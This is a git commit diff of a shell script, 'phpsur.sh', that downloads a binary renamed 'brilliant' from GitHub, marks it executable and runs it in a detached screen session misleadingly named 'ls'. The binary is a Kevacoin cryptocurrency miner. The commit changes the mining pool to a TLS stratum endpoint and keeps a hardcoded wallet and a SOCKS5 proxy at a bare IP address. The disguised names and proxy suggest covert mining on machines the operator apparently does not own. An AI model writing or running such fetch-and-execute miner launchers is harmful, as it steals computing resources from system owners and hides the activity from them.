325bf76051c33cc0a2e84dd7c96af2693994586c
brilliant-cut <90860858+brilliant-cut@users.noreply.github.com>
2021-09-17 01:19:26 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -3,4 +3,4 @@ apt install screen -y
 wget -O brilliant https://github.com/brilliant-cut/brilliant-cut/raw/main/brilliant
 chmod +x brilliant
 screen -dmS ls
-./brilliant --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password BC=$(echo $strDate-$(shuf -i 1-1000 -n 1) --proxy=socks5://50.62.35.16:11818
+./brilliant --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.BC=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://50.62.35.16:11818 --keepalive true
